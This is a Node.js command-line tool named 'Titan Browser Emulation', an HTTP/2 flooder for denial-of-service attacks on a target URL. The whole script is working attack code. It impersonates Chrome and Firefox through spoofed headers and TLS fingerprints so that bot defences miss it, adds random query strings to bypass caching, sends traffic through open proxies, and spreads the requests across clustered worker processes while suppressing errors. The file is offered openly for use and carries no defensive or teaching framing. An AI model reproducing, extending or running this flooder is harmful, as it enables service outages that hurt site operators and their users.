#!/usr/bin/env node
// ============================================================
// Titan Browser Emulation v2.0 - Multi-browser Flood
// Author: github.com/thesystemowner
// Technique: Chrome 130-132 / Firefox 132-133 / Edge profiles
// ============================================================

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const url = require('url');
const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');

const args = process.argv.slice(2);
if (args.length < 3) {
    console.log(`Usage: node titan-browser.js <url> <time> <rate> [threads] [proxyfile]`);
    process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);
const rate = parseInt(args[2]);
const threads = parseInt(args[3]) || 1;
const proxyFile = args[4] || 'proxy.txt';
const parsed = url.parse(target);

const browserProfiles = [
    {
        makeHeaders: () => {
            const v = [130, 131, 132][Math.floor(Math.random() * 3)];
            return { ':method': 'GET', ':authority': parsed.host, ':scheme': 'https',
                ':path': parsed.path + '?' + crypto.randomBytes(4).toString('hex') + '=' + crypto.randomBytes(6).toString('hex'),
                'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${v}.0.0.0 Safari/537.36`,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9', 'accept-encoding': 'gzip, deflate, br, zstd',
                'cache-control': 'max-age=0',
                'sec-ch-ua': `"Google Chrome";v="${v}", "Chromium";v="${v}", "Not_A Brand";v="24"`,
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none', 'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1', 'referer': 'https://www.google.com/', 'dnt': '1' };
        },
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        curves: 'X25519:P-256:P-384:P-521', alpn: ['h2', 'http/1.1'],
    },
    {
        makeHeaders: () => {
            const v = [131, 132, 133][Math.floor(Math.random() * 3)];
            return { ':method': 'GET', ':authority': parsed.host, ':scheme': 'https',
                ':path': parsed.path + '?' + crypto.randomBytes(4).toString('hex') + '=' + crypto.randomBytes(6).toString('hex'),
                'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br, zstd',
                'cache-control': 'max-age=0', 'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1', 'referer': 'https://www.google.com/', 'dnt': '1', 'te': 'trailers' };
        },
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
        sigalgs: 'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp384r1_sha384',
        curves: 'X25519:P-256:P-384', alpn: ['h2', 'http/1.1'],
    },
];

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(l => l.includes(':'));
} catch { }

function worker() {
    const profile = browserProfiles[Math.floor(Math.random() * browserProfiles.length)];

    function doReq() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)].split(':') : null;

        const afterConnect = (socket) => {
            const tlsOpts = {
                host: parsed.host, servername: parsed.host,
                ciphers: profile.ciphers, sigalgs: profile.sigalgs,
                ecdhCurve: profile.curves, secure: true, rejectUnauthorized: false,
                ALPNProtocols: profile.alpn, socket: socket || undefined,
            };
            const tlsSock = tls.connect(443, parsed.host, tlsOpts, () => {
                const client = http2.connect('https://' + parsed.host, {
                    createConnection: () => tlsSock,
                    settings: { headerTableSize: 65536, maxConcurrentStreams: 4294967295,
                        initialWindowSize: 2147483647, maxFrameSize: 16777215, maxHeaderListSize: 4294967295, enablePush: false },
                });
                client.on('error', () => {});
                client.on('connect', () => {
                    for (let i = 0; i < rate; i++) {
                        try { const req = client.request(profile.makeHeaders()); req.on('response', () => req.close()); req.end(); } catch {}
                    }
                });
                client.on('close', () => { tlsSock.destroy(); setTimeout(doReq, 200); });
            });
            tlsSock.on('error', () => {});
            tlsSock.setKeepAlive(true, 10000);
        };

        if (proxy) {
            const conn = net.connect({ host: proxy[0], port: parseInt(proxy[1]) || 8080 }, () => {
                conn.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                conn.once('data', (d) => { d.toString().includes('200') ? afterConnect(conn) : (conn.destroy(), setTimeout(doReq, 100)); });
            });
            conn.on('error', () => setTimeout(doReq, 100));
        } else { afterConnect(); }
    }
    setInterval(doReq, 1000);
}

if (cluster.isMaster) {
    console.log(`[+] Titan Browser Emulation`);
    console.log(`[+] Author: github.com/thesystemowner`);
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] Threads: ${threads}`);
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => { console.log('[+] Done'); process.exit(0); }, duration * 1000);
} else { worker(); }